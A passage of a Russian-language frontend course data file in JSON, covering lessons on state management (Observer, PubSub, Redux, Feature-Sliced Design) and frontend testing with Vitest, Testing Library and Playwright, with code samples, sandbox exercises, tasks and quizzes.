          "content": "Для реактивного обновления интерфейса при изменении состояния используются классические поведенческие паттерны GoF:\n\n1. **Паттерн Observer (Наблюдатель)**:\n- Субъект (`Subject` / `Observable`) хранит состояние и массив функций-подписчиков (`observers`).\n- При изменении состояния субъект вызывает метод `notify()`, оповещая всех зарегистрированных наблюдателей.\n- Лежит в основе реактивности Vue 3 (`reactive`/`ref`), MobX и RxJS.\n\n2. **Паттерн Publish-Subscribe (PubSub / Шина событий)**:\n- В отличие от Observer, отправитель (`Publisher`) и получатель (`Subscriber`) ВООБЩЕ НЕ ЗНАЮТ о существовании друг друга!\n- Они общаются через посредника — брокер событий (`EventBus` / `EventEmitter`).\n- `bus.on('ORDER_COMPLETED', handleAnalytics)` (подписка)\n- `bus.emit('ORDER_COMPLETED', { orderId: 402 })` (публикация события).\n- Идеален для слабой связности (Decoupling) независимых модулей приложения.",
          "codeExample": {
            "language": "javascript",
            "code": "// Реализация универсальной реактивной шины событий PubSub:\nclass EventEmitter {\n  constructor() {\n    this.events = new Map();\n  }\n\n  // Подписка на событие\n  on(eventName, callback) {\n    if (!this.events.has(eventName)) {\n      this.events.set(eventName, new Set());\n    }\n    this.events.get(eventName).add(callback);\n    \n    // Возвращаем функцию отписки\n    return () => this.events.get(eventName)?.delete(callback);\n  }\n\n  // Публикация события\n  emit(eventName, data) {\n    const listeners = this.events.get(eventName);\n    if (listeners) {\n      listeners.forEach((callback) => callback(data));\n    }\n  }\n}",
            "title": "Реализация паттерна Publish-Subscribe (EventEmitter)",
            "explanation": "EventEmitter использует Map и Set для безопасного хранения подписчиков и возвращает функцию отписки для предотвращения утечек памяти."
          }
        },
        {
          "title": "Однонаправленный поток данных (Unidirectional Data Flow) и Redux",
          "content": "Архитектура Redux (Flux-паттерн) решает проблему непредсказуемых мутаций данных:\n\n3 Фундаментальных принципа Redux:\n1. **Единый источник правды (Single Source of Truth)**:\nВсе глобальное состояние приложения хранится в едином объекте — `Store`.\n\n2. **Состояние только для чтения (State is Read-Only)**:\nЕдинственный способ изменить состояние — отправить объект Действия (`Action`), описывающий намерение: `dispatch({ type: 'cart/addItem', payload: product })`.\n\n3. **Изменения происходят через Чистые Функции (Reducers)**:\nРедьюсер принимает `(currentState, action)` и возвращает АБСОЛЮТНО НОВЫЙ объект состояния `newState`.\n\nРедьюсер СТРОГО обязан быть чистой функцией (Pure Function):\n- Никаких мутаций исходного `state` (всегда возвращайте `{ ...state, ... }`)!\n- Никаких асинхронных вызовов (`fetch`), генераторов случайных чисел (`Math.random()`) или чтения дат (`new Date()`) внутри редьюсера!\n- Селекторы (Selectors) извлекают и мемоизируют нужные кусочки состояния (`selectCartTotal(state)`).",
          "codeExample": {
            "language": "javascript",
            "code": "// 1. Чистый редьюсер управления корзиной\nfunction cartReducer(state = { items: [], total: 0 }, action) {\n  switch (action.type) {\n    case 'CART_ADD_ITEM': {\n      const item = action.payload;\n      const newItems = [...state.items, item];\n      return {\n        ...state,\n        items: newItems,\n        total: state.total + item.price\n      };\n    }\n    case 'CART_CLEAR':\n      return { items: [], total: 0 };\n    default:\n      return state;\n  }\n}\n\n// 2. Селектор с вычислением количества товаров\nconst selectCartCount = (state) => state.items.length;",
            "title": "Чистый редьюсер и селектор в Redux-архитектуре",
            "explanation": "Редьюсер cartReducer не мутирует state.items, а создает новый массив через spread [...state.items, item], обеспечивая предсказуемость."
          }
        },
        {
          "title": "Архитектура Feature-Sliced Design (FSD) и слои приложения",
          "content": "Feature-Sliced Design (FSD) — передовая архитектурная методология организации фронтенд-проектов, стандартизирующая структуру кода для командной разработки.\n\nИерархия слоев FSD (строго сверху вниз по правилу зависимостей):\n1. `app/` — инициализация приложения (провайдеры Store, глобальные стили, роутер).\n2. `pages/` — компоненты страниц приложения (`HomePage`, `CatalogPage`, `ProfilePage`).\n3. `widgets/` — самостоятельные крупные UI-блоки (`Header`, `Sidebar`, `Feed`, `CartWidget`).\n4. `features/` — пользовательские сценарии и бизнес-фичи (`AuthByEmail`, `AddToCart`, `FilterCatalog`).\n5. `entities/` — бизнес-сущности предметной области (`User`, `Product`, `Order`, `Comment`).\n6. `shared/` — переиспользуемый инфраструктурный код (`UI-Kit`, `API Client`, хелперы, типы).\n\nГлавное архитектурное правило FSD:\nМодули могут импортировать код ТОЛЬКО из слоев, расположенных СТРОГО НИЖЕ их по иерархии! Слой `entities/` не может знать о существовании `features/` или `pages/`. Модули одного слоя не могут импортировать друг друга (Cross-Imports запрещены!).",
          "codeExample": {
            "language": "typescript",
            "code": "// Структура слоев Feature-Sliced Design (FSD) в проекте:\n// src/\n// ├── app/         <- Провайдеры Redux/React Router, global.css\n// ├── pages/       <- Каталог (CatalogPage), Корзина (CartPage)\n// ├── widgets/     <- Шапка (Header), Карточка товара (ProductCard)\n// ├── features/    <- Добавить в корзину (AddToCartBtn), Поиск (SearchInput)\n// ├── entities/    <- Модель пользователя (User), Модель товара (Product)\n// └── shared/      <- UI кнопки (Button), Сетевой клиент (httpClient)\n\n// Пример импорта по правилам FSD (строго сверху вниз):\n// Внутри widgets/Header:\nimport { SearchInput } from '@/features/search'; // ✅ features ниже widgets\nimport { UserAvatar } from '@/entities/user';    // ✅ entities ниже widgets\nimport { Button } from '@/shared/ui';           // ✅ shared ниже widgets",
            "title": "Организация слоев и правила импортов в Feature-Sliced Design",
            "explanation": "Правило направленности зависимостей FSD исключает циклические импорты и делает кодовую базу масштабируемой для сотен разработчиков."
          }
        }
      ],
      "seniorTips": [
        "Храните в глобальном стейте только те данные, которые действительно нужны нескольким независимым экранам или виджетам. Локальное состояние (открыт ли dropdown, текст текущего инпута) должно оставаться локальным внутри компонента.",
        "Всегда синхронизируйте ключевые фильтры и параметры сортировки с URL-параметрами поиска (`?page=2&filter=active`) — это позволяет пользователям делиться прямыми ссылками и сохранять состояние при перезагрузке.",
        "Редьюсеры в архитектуре State Management ВСЕГДА должны быть абсолютно чистыми функциями без сайд-эффектов (никаких `fetch`, `Math.random()` или мутаций внутри редьюсера!).",
        "Придерживайтесь правила однонаправленного потока зависимостей FSD: модули нижних слоев (`entities`, `shared`) никогда не должны импортировать код из верхних слоев (`features`, `pages`)."
      ],
      "commonMistakes": [
        {
          "bad": "// Мутация стейта внутри редьюсера\nfunction reducer(state, action) {\n  state.user.name = action.payload; // ❌ Прямая мутация!\n  return state;\n}",
          "good": "function reducer(state, action) {\n  return {\n    ...state,\n    user: { ...state.user, name: action.payload }\n  };\n}",
          "reason": "Прямая мутация объекта оставляет ту же ссылку на память. React и Redux используют сравнение по ссылке и не обнаружат изменение, не перерисовав экран."
        },
        {
          "bad": "// Хранение временного значения каждого текстового инпута в глобальном Store\ndispatch({ type: 'SEARCH_INPUT_KEYSTROKE', payload: 'a' });",
          "good": "// Использование локального useState для инпута и отправка в Store только по Debounce/Submit",
          "reason": "Отправка каждого символа в глобальный Store вызывает пересчет всего дерева компонентов приложения, приводя к лагам при наборе текста."
        },
        {
          "bad": "// Нарушение FSD: импорт верхнего слоя внутри нижнего\n// Внутри entities/user/model.ts:\nimport { Header } from '@/widgets/Header'; // ❌ Ошибка архитектуры!",
          "good": "// Сущности (entities) должны быть изолированы и не знать о виджетах и страницах",
          "reason": "Циклические зависимости и импорт верхних слоев разрушают модульность и делают невозможным переиспользование сущностей."
        }
      ],
      "keyTakeaways": [
        "`UI = f(State)` — фундаментальный принцип: интерфейс является чистой проекцией состояния данных.",
        "URL-параметры (`?sort=price&page=2`) — важнейшая часть состояния для фильтров, сортировок и пагинации.",
        "Observer и PubSub обеспечивают слабую связность и реактивное уведомление подписчиков при изменении стейта.",
        "Redux строится на однонаправленном потоке: `Action -> Reducer (чистая функция) -> Store -> UI`.",
        "Feature-Sliced Design (FSD) делит проект на слои `app -> pages -> widgets -> features -> entities -> shared` со строгим направлением импортов сверху вниз."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"redux-app\">\n  <h3>Мини Redux Store (UI = f(State))</h3>\n  <div style=\"font-size:24px; font-weight:bold; margin:12px 0;\" id=\"counter-val\">0</div>\n  <div style=\"display:flex; gap:8px;\">\n    <button id=\"btn-inc\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">+1 Increment</button>\n    <button id=\"btn-dec\" style=\"background:#ffb02e; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">-1 Decrement</button>\n    <button id=\"btn-reset\" style=\"background:#f85149; color:#fff; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Reset</button>\n  </div>\n</div>",
      "initialCss": "#redux-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "function createStore(reducer, initialState) {\n  let state = initialState;\n  const listeners = new Set();\n  return {\n    getState: () => state,\n    dispatch: (action) => {\n      state = reducer(state, action);\n      listeners.forEach(fn => fn());\n    },\n    subscribe: (fn) => {\n      listeners.add(fn);\n      return () => listeners.delete(fn);\n    }\n  };\n}\n\nfunction counterReducer(state = { count: 0 }, action) {\n  switch (action.type) {\n    case 'INC': return { count: state.count + 1 };\n    case 'DEC': return { count: state.count - 1 };\n    case 'RESET': return { count: 0 };\n    default: return state;\n  }\n}\n\nconst store = createStore(counterReducer, { count: 0 });\nconst valEl = document.getElementById('counter-val');\n\nstore.subscribe(() => {\n  valEl.textContent = store.getState().count;\n});\n\ndocument.getElementById('btn-inc').onclick = () => store.dispatch({ type: 'INC' });\ndocument.getElementById('btn-dec').onclick = () => store.dispatch({ type: 'DEC' });\ndocument.getElementById('btn-reset').onclick = () => store.dispatch({ type: 'RESET' });",
      "instructions": "Практика со State Management:\n1. Нажмите кнопки и наблюдайте работу однонаправленного потока dispatch -> reducer -> subscribe -> render\n2. Добавьте действие { type: 'ADD_BY', payload: 10 }\n3. Добавьте в состояние массив логов истории изменений state.history"
    },
    "task": {
      "title": "Разработка реактивного State Management Store с историей действий и мемоизацией",
      "scenario": "Вам необходимо спроектировать микро-библиотеку управления состоянием: хранилище Store должно поддерживать подписку через subscribe, иммутабельное обновление через чистый редьюсер, запись истории экшенов (Action Log) и мемоизированный селектор createSelector.",
      "criteria": [
        "Класс Store инкапсулирует состояние и список подписчиков",
        "Метод dispatch(action) обновляет состояние через редьюсер строго иммутабельно",
        "Метод subscribe(listener) возвращает функцию отписки",
        "Реализована функция createSelector(selectFn), кэширующая результат при неизменном стейте",
        "Редьюсер является чистой функцией без побочных эффектов"
      ],
      "starterCode": {
        "js": "// Реализуйте реактивное хранилище Store\nclass Store {\n  constructor(reducer, initialState) {\n    // Ваш код\n  }\n}"
      },
      "hints": [
        "В Store храните let state и Set подписчиков",
        "В createSelector кэшируйте: let lastState, lastResult;",
        "Проверяйте lastState === currentState по ссылке"
      ],
      "solution": {
        "js": "class Store {\n  #state;\n  #reducer;\n  #listeners = new Set();\n  #history = [];\n\n  constructor(reducer, initialState = {}) {\n    this.#reducer = reducer;\n    this.#state = initialState;\n  }\n\n  getState() {\n    return this.#state;\n  }\n\n  getHistory() {\n    return [...this.#history];\n  }\n\n  dispatch(action) {\n    if (!action || typeof action.type !== 'string') {\n      throw new Error('Action must have a string type');\n    }\n    this.#state = this.#reducer(this.#state, action);\n    this.#history.push(action);\n    this.#listeners.forEach((listener) => listener(this.#state));\n  }\n\n  subscribe(listener) {\n    this.#listeners.add(listener);\n    return () => this.#listeners.delete(listener);\n  }\n}\n\nfunction createSelector(selectorFn) {\n  let lastState = null;\n  let lastResult = null;\n  return (state) => {\n    if (state === lastState) {\n      return lastResult;\n    }\n    lastState = state;\n    lastResult = selectorFn(state);\n    return lastResult;\n  };\n}",
        "explanation": "Хранилище Store реализует чистый однонаправленный поток Redux с приватными полями, возвратом функции отписки и мемоизированным селектором createSelector для максимальной производительности."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro7-q1",
          "question": "В чём заключается концепция UI = f(State) в современной веб-разработке?",
          "options": [
            "Пользовательский интерфейс (UI) является чистой математической проекцией текущего состояния данных (State), и разработчик меняет состояние, а фреймворк декларативно обновляет DOM",
            "UI пишется только на языке C++",
            "State обновляется только после перезагрузки страницы",
            "UI создается один раз и никогда не меняется"
          ],
          "correctIndex": 0,
          "explanation": "Формула UI = f(State) означает, что вид экрана в любой момент времени полностью предопределен объектом состояния State. Декларативный рендеринг избавляет от ручных мутаций DOM."
        },
        {
          "id": "pro7-q2",
          "question": "Какое ключевое требование предъявляется к функциям-редьюсерам (Reducers) в Redux-архитектуре?",
          "options": [
            "Редьюсер должен делать асинхронные HTTP-запросы",
            "Редьюсер обязан быть Чистой Функцией (Pure Function): не мутировать входные аргументы, не производить побочных эффектов и возвращать новый объект состояния",
            "Редьюсер должен сохранять данные в localStorage",
            "Редьюсер должен вызывать alert()"
          ],
          "correctIndex": 1,
          "explanation": "Редьюсеры в Redux обязаны быть строго чистыми функциями. Они принимают (state, action) и возвращают новый иммутабельный объект состояния без мутаций и сайд-эффектов."
        },
        {
          "id": "pro7-q3",
          "question": "Какие данные ОБЯЗАТЕЛЬНО следует хранить в URL Query параметрах (?sort=price&page=2), а не в скрытом стейте?",
          "options": [
            "Пароли пользователей",
            "Параметры фильтрации, поисковые запросы, сортировки и пагинацию списков, чтобы пользователи могли делиться ссылкой и сохранять состояние при перезагрузке",
            "Тексты всплывающих подсказок",
            "Временные координаты курсора мыши"
          ],
          "correctIndex": 1,
          "explanation": "Хранение фильтров, пагинации и поиска в URL позволяет пользователям отправлять точные ссылки коллегам, открывать страницы в новых вкладках и пользоваться кнопками 'Назад/Вперед' в браузере."
        },
        {
          "id": "pro7-q4",
          "question": "Какое главное правило импортов действует в архитектуре Feature-Sliced Design (FSD)?",
          "options": [
            "Все файлы могут свободно импортировать друг друга",
            "Модули могут импортировать код ТОЛЬКО из слоев, расположенных СТРОГО НИЖЕ их по иерархии (app -> pages -> widgets -> features -> entities -> shared), а кросс-импорты на одном слое запрещены",
            "Импорты разрешены только снизу вверх",
            "Запрещено использовать TypeScript"
          ],
          "correctIndex": 1,
          "explanation": "Направленность зависимостей FSD сверху вниз исключает возникновение циклических связей и делает архитектуру масштабируемой: нижние слои (shared, entities) полностью автономны."
        },
        {
          "id": "pro7-q5",
          "question": "В чём заключается различие между паттернами Observer (Наблюдатель) и PubSub (Publish-Subscribe)?",
          "options": [
            "Observer работает только в Node.js",
            "В Observer субъект напрямую хранит ссылки на своих наблюдателей, а в PubSub издатель и подписчик полностью изолированы и общаются через сторонний брокер событий (EventBus)",
            "PubSub не поддерживает передачу данных",
            "Разницы нет"
          ],
          "correctIndex": 1,
          "explanation": "В паттерне PubSub между издателем и подписчиком появляется центральная шина событий (Event Channel). Отправитель не знает, кто слушает событие, обеспечивая максимальное разделение модулей (Decoupling)."
        }
      ]
    }
  },
  {
    "id": "pro-8",
    "moduleId": "pro",
    "level": 8,
    "title": "Тестирование фронтенда: Unit, Integration, E2E и Vitest/Playwright",
    "subtitle": "Пирамида тестирования, Vitest, Testing Library, Playwright, TDD и Mocking",
    "description": "Освойте культуру автоматизированного тестирования фронтенда: пирамиду тестов (Unit, Integration, E2E), модульные тесты чистых функций в Vitest по паттерну AAA, компонентное тестирование с Testing Library, E2E автоматизацию браузера с Playwright и мокирование через MSW.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "testing",
      "unit-tests",
      "vitest",
      "playwright",
      "testing-library",
      "e2e",
      "tdd",
      "mocking"
    ],
    "theory": {
      "overview": "Автоматизированное тестирование — главный гарант стабильности коммерческого продукта. Без тестов любой рефакторинг или добавление новой фичи рискует сломать критические бизнес-сценарии (оформление заказа, авторизацию, расчет скидок).\n\nВ этом уроке мы разберём пирамиду тестирования (Testing Pyramid), научимся писать быстрые Unit-тесты с помощью современного раннера Vitest по паттерну Arrange-Act-Assert, тестировать компоненты с Testing Library с точки зрения реального пользователя, мокировать сетевые запросы через MSW и автоматизировать сквозные E2E сценарии в реальных браузерах с Playwright.",
      "sections": [
        {
          "title": "Пирамида тестирования (Testing Pyramid) и метрики покрытия",
          "content": "Пирамида тестирования определяет оптимальный баланс между скоростью, стоимостью и надежностью тестов:\n\n1. **Unit-тесты (Модульные тесты — 70% базы)**:\n- Тестируют чистые функции, утилиты, хелперы, редьюсеры и хуки в полной изоляции.\n- Выполняются за миллисекунды (тысячи тестов за 2 секунды в Vitest).\n- Дешевы в написании и мгновенно локализуют место поломки.\n\n2. **Integration-тесты (Интеграционные тесты — 20% базы)**:\n- Тестируют совместную работу нескольких модулей: компонент формы + валидация + взаимодействие со стейтом + мок сетевого ответа API (React Testing Library + MSW).\n\n3. **E2E-тесты (End-to-End / Сквозные тесты — 10% вершины)**:\n- Запускают настоящий headless-браузер (Chromium, Firefox, WebKit) и эмулируют реальные действия пользователя (Playwright / Cypress): переход на сайт, клики, ввод пароля, оплата через Stripe/ЮKassa.\n- Самые надежные, но самые медленные и дорогие в поддержке.\n\nМетрика Code Coverage (Покрытие кода):\nПоказывает процент строк (Lines), условий (Branches) и функций (Functions), затронутых тестами. Норма для коммерческих проектов: 75–85%. Помните: 100% покрытие не гарантирует отсутствие багов в граничных случаях (Edge Cases)!",
          "image": {
            "src": "/images/lessons/web-testing-pyramid.svg",
            "alt": "Пирамида тестирования: Unit Vitest, Integration Testing Library, E2E Playwright",
            "caption": "Пирамида тестов: 70% Unit (быстро/дешево), 20% Integration (компоненты со стейтом) и 10% E2E Playwright (сквозные сценарии)"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// Пример модульного теста чистой функции расчета скидки в Vitest:\nimport { describe, it, expect } from 'vitest';\nimport { calculateCartTotal } from './cartUtils';\n\ndescribe('calculateCartTotal()', () => {\n  it('должен корректно применять промокод 20%', () => {\n    // 1. Arrange (Подготовка)\n    const items = [{ price: 1000 }, { price: 2000 }];\n    const promo = { discountPercent: 20 };\n    \n    // 2. Act (Действие)\n    const total = calculateCartTotal(items, promo);\n    \n    // 3. Assert (Проверка)\n    expect(total).toBe(2400); // 3000 - 20% = 2400\n  });\n});",
            "title": "Unit-тест функции по паттерну AAA (Arrange-Act-Assert) в Vitest",
            "explanation": "Тест изолирован, структурирован по блокам Arrange-Act-Assert и выполняется в Vitest за 2 миллисекунды."
          }
        },
        {
          "title": "Unit-тестирование с Vitest: Паттерн AAA и матчеры",
          "content": "Vitest — сверхбыстрый раннер тестов нового поколения, нативно интегрированный с Vite и ESM:\n\n1. Паттерн структуры теста **AAA (Arrange -> Act -> Assert)**:\n- **Arrange (Подготовка)**: создание тестовых данных, переменных, моков.\n- **Act (Действие)**: вызов тестируемой функции или метода.\n- **Assert (Проверка)**: сравнение полученного результата с ожидаемым через `expect()`.\n\n2. Базовые матчеры Vitest:\n- `expect(val).toBe(42)` — строгое равенство примитивов (`===`).\n- `expect(obj).toEqual({ a: 1 })` — глубокое сравнение объектов и массивов по значению.\n- `expect(arr).toContain('admin')` — проверка наличия элемента в массиве.\n- `expect(fn).toThrowError('Invalid input')` — проверка выброса исключения.\n- `expect(val).toBeNull()`, `.toBeDefined()`, `.toBeCloseTo(0.3, 2)` (для дробей `0.1 + 0.2`).\n\n3. Мокирование (Mocks & Spies):\n- `const spy = vi.fn()` — создание функции-пустышки для отслеживания вызовов (`expect(spy).toHaveBeenCalledWith('success')`).",
          "codeExample": {
            "language": "javascript",
            "code": "import { describe, it, expect, vi } from 'vitest';\n\nfunction notifyUser(user, sendEmailFn) {\n  if (!user.email) throw new Error('Email отсутствует');\n  sendEmailFn(user.email, 'Добро пожаловать!');\n}\n\ndescribe('notifyUser()', () => {\n  it('должен вызывать sendEmailFn с правильным адресом', () => {\n    const mockSendEmail = vi.fn(); // Мок функции\n    const user = { id: 1, email: 'intern@academy.ru' };\n\n    notifyUser(user, mockSendEmail);\n\n    expect(mockSendEmail).toHaveBeenCalledTimes(1);\n    expect(mockSendEmail).toHaveBeenCalledWith(\n      'intern@academy.ru',\n      'Добро пожаловать!'\n    );\n  });\n});",
            "title": "Мокирование функций с помощью vi.fn() в Vitest",
            "explanation": "vi.fn() перехватывает вызов, аргументы и количество вызовов функции sendEmailFn без отправки реальных писем."
          }
        },
        {
          "title": "Тестирование компонентов с Testing Library: Поведение вместо деталей",
          "content": "Философия React / DOM Testing Library:\n*«Чем больше ваши тесты похожи на то, как реальный пользователь использует приложение, тем больше уверенности они дают».*\n\n1. Приоритет поиска элементов по доступности (Query Priority):\n- 1-й приоритет (Рекомендуется!): `screen.getByRole('button', { name: /войти/i })`, `screen.getByRole('heading', { level: 1 })`.\n- 2-й приоритет: `screen.getByLabelText('Пароль')` (связка с `<label>`).\n- 3-й приоритет: `screen.getByText('Успешно сохранено')`.\n- ❌ Антипаттерн: `container.querySelector('.btn-primary')` или `getByTestId` — пользователь не видит CSS-классы, а смена класса сломает тест!\n\n2. События пользователя: `@testing-library/user-event`:\nБиблиотека `userEvent` эмулирует реальный ввод: клики с фокусом, ввод символов с проверкой раскладки и событиями `keydown/keyup`:\n`await userEvent.type(input, 'password123');`\n`await userEvent.click(submitButton);`.",
          "codeExample": {
            "language": "javascript",
            "code": "import { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { LoginForm } from './LoginForm';\n\ntest('успешная отправка формы авторизации', async () => {\n  const handleSuccess = vi.fn();\n  render(<LoginForm onLoginSuccess={handleSuccess} />);\n\n  // 1. Поиск элементов по семантическим ролям\n  const emailInput = screen.getByLabelText(/электронная почта/i);\n  const passInput = screen.getByLabelText(/пароль/i);\n  const submitBtn = screen.getByRole('button', { name: /войти/i });\n\n  // 2. Действия пользователя\n  await userEvent.type(emailInput, 'dev@intern.ru');\n  await userEvent.type(passInput, 'secretPass123');\n  await userEvent.click(submitBtn);\n\n  // 3. Проверка результата\n  expect(handleSuccess).toHaveBeenCalledWith({\n    email: 'dev@intern.ru',\n    pass: 'secretPass123'\n  });\n});",
            "title": "Компонентный тест формы с Testing Library и userEvent",
            "explanation": "Тест ищет элементы по ролям и меткам labelText так же, как незрячий пользователь или человек с клавиатурой, гарантируя доступность."
          }
        },
        {
          "title": "E2E тестирование с Playwright и методология TDD",
          "content": "Сквозное тестирование реальных пользовательских сценариев:\n\n1. Преимущества Playwright:\n- Запуск в реальных движках: Chromium (Chrome, Edge), WebKit (Safari), Firefox.\n- Автоматическое ожидание (Auto-Waiting): Playwright сам ждёт, пока кнопка станет видимой, активной и завершится анимация перед кликом (нет нужды в `sleep(5000)`!).\n- Встроенный перехват сетевых запросов и запись видео сбоев.\n\n2. Паттерн Page Object Model (POM):\nИнкапсуляция работы со страницей в отдельный класс `LoginPage`, чтобы при изменении селекторов править 1 класс, а не 50 тестов.\n\n3. Методология TDD (Test-Driven Development):\nЦикл **Red -> Green -> Refactor**:\n- **Red**: пишем тест на новую функциональность -> тест падает (красный).\n- **Green**: пишем минимально необходимый рабочий код -> тест проходит (зеленый).\n- **Refactor**: улучшаем архитектуру и чистоту кода, сохраняя тесты зелеными.",
          "codeExample": {
            "language": "javascript",
            "code": "// Playwright E2E тест полного сценария покупки в интернет-магазине:\nimport { test, expect } from '@playwright/test';\n\ntest('пользователь может добавить товар в корзину и оформить заказ', async ({ page }) => {\n  // 1. Открытие страницы каталога\n  await page.goto('https://shop.intern.dev/catalog');\n\n  // 2. Клик по первому товару\n  const firstProduct = page.locator('.product-card').first();\n  await firstProduct.getByRole('button', { name: /в корзину/i }).click();\n\n  // 3. Переход в корзину\n  await page.getByRole('link', { name: /корзина/i }).click();\n\n  // 4. Проверка обновления бейджа корзины\n  await expect(page.getByText('Товаров в корзине: 1')).toBeVisible();\n  await expect(page.getByRole('button', { name: /оформить заказ/i })).toBeEnabled();\n});",
            "title": "Сквозной E2E-тест пользовательского сценария в Playwright",
            "explanation": "Playwright автоматически ожидает появления элементов и эмулирует полный путь покупателя в реальном окне браузера."
          }
        }
      ],
      "seniorTips": [
        "В тестах компонентов ВСЕГДА ищите элементы по доступным ролям `screen.getByRole('button', { name: ... })` вместо хрупких CSS-классов `.btn-primary` или `id`. Это гарантирует доступность интерфейса.",
        "Используйте Mock Service Worker (MSW) для перехвата сетевых запросов на уровне сети вместо ручного мокирования `global.fetch`.",
        "Следуйте правилу AAA (Arrange, Act, Assert) для кристально чистой структуры каждого тест-кейса.",
        "Не тестируйте детали реализации (приватные методы, внутренний стейт). Тестируйте только публичный контракт и поведение, видимое пользователю."
      ],
      "commonMistakes": [
        {
          "bad": "// Поиск элементов по нестабильным классам стилей\nconst btn = container.querySelector('.css-18df-submit-btn');",
          "good": "const btn = screen.getByRole('button', { name: /отправить/i });",
          "reason": "При любом рефакторинге стилей или переходе на другой CSS-фреймворк тесты с поиском по классам немедленно упадут."
        },
        {
          "bad": "// Забытый await перед асинхронными действиями userEvent\nuserEvent.click(submitBtn); // ❌ Промис не ожидается, тест завершается раньше времени!",
          "good": "await userEvent.click(submitBtn);",
          "reason": "userEvent работает асинхронно. Без await проверка expect выполнится до того, как обработчик клика успеет завершиться."
        },
        {
          "bad": "// Тестирование приватного состояния компонента\nexpect(component.state.isLoading).toBe(true);",
          "good": "expect(screen.getByText(/загрузка/i)).toBeInTheDocument();",
          "reason": "Пользователь не видит state.isLoading — он видит индикатор загрузки на экране. Тестируйте визуальное поведение."
        }
      ],
      "keyTakeaways": [
        "Пирамида тестов: 70% быстрых Unit-тестов, 20% Integration-тестов компонентов и 10% E2E Playwright сценариев.",
        "Структура теста всегда следует правилу AAA: Arrange (подготовка) -> Act (действие) -> Assert (проверка).",
        "Testing Library рекомендует искать элементы по семантическим ролям `getByRole`, эмулируя опыт реального пользователя.",
        "Playwright автоматизирует реальные браузеры с авто-ожиданием видимости элементов.",
        "TDD цикл Red -> Green -> Refactor обеспечивает высокую надежность и архитектурную чистоту кода."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"test-runner-app\">\n  <h3>Мини Test Runner (Vitest Assertions)</h3>\n  <button id=\"run-tests-btn\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Запустить Unit-тесты</button>\n  <div id=\"test-report\" style=\"margin-top:12px; font-family:monospace; font-size:12px;\"></div>\n</div>",
      "initialCss": "#test-runner-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}\n.pass-row { color: #2dff8a; margin-bottom: 4px; }\n.fail-row { color: #f85149; margin-bottom: 4px; }",
      "initialJs": "const reportEl = document.getElementById('test-report');\n\nfunction expect(actual) {\n  return {\n    toBe: (expected) => {\n      if (actual !== expected) throw new Error(`Expected ${expected}, but got ${actual}`);\n    },\n    toEqual: (expected) => {\n      if (JSON.stringify(actual) !== JSON.stringify(expected)) {\n        throw new Error(`Expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);\n      }\n    }\n  };\n}\n\nfunction test(name, fn) {\n  try {\n    fn();\n    reportEl.innerHTML += `<div class='pass-row'>✓ PASS: ${name}</div>`;\n  } catch (err) {\n    reportEl.innerHTML += `<div class='fail-row'>✕ FAIL: ${name} -> ${err.message}</div>`;\n  }\n}\n\n// Функция для тестирования\nconst calculateDiscount = (price, percent) => price - (price * percent / 100);\n\ndocument.getElementById('run-tests-btn').onclick = () => {\n  reportEl.innerHTML = '';\n  test('расчет скидки 10% от 1000', () => {\n    expect(calculateDiscount(1000, 10)).toBe(900);\n  });\n  test('скидка 0% не меняет цену', () => {\n    expect(calculateDiscount(500, 0)).toBe(500);\n  });\n  test('глубокое сравнение объектов', () => {\n    expect({ role: 'admin' }).toEqual({ role: 'admin' });\n  });\n};",
      "instructions": "Практика с автотестами:\n1. Нажмите кнопку 'Запустить Unit-тесты' и изучите отчет прохождения\n2. Добавьте тест для проверки расчета скидки 100% (должен вернуть 0)\n3. Напишите тест с ожидаемой ошибкой и посмотрите, как Test Runner фиксирует падение"
    },
    "task": {
      "title": "Написание набора Unit и Integration тестов для модуля оформления заказа",
      "scenario": "Вам необходимо написать комплект надежных модульных тестов для функции checkoutService(cart, promoCode, user): тесты должны проверять расчет итоговой суммы со скидкой, валидацию промокодов, обработку пустого профиля пользователя и исключения при отрицательных ценах по стандарту AAA.",
      "criteria": [
        "Тесты написаны по паттерну Arrange-Act-Assert (AAA)",
        "Проверена корректность расчета суммы нескольких товаров с учетом скидки",
        "Проверена обработка невалидного промокода",
        "Проверен выброс ошибки при отсутствии обязательного поля email пользователя",
        "Использованы матчеры toBe, toEqual и toThrowError"
      ],
      "starterCode": {
        "js": "// Реализуйте функцию и набор тестов\nfunction checkoutService(cart, promo, user) {\n  // Ваш код\n}"
      },
      "hints": [
        "В блоке Arrange создайте тестовую корзину: const cart = [{ price: 1000 }, { price: 2000 }];",
        "Для проверки ошибок используйте: expect(() => checkoutService(...)).toThrowError();",
        "Проверьте правильность итоговой суммы через expect(res.finalTotal).toBe(2700);"
      ],
      "solution": {
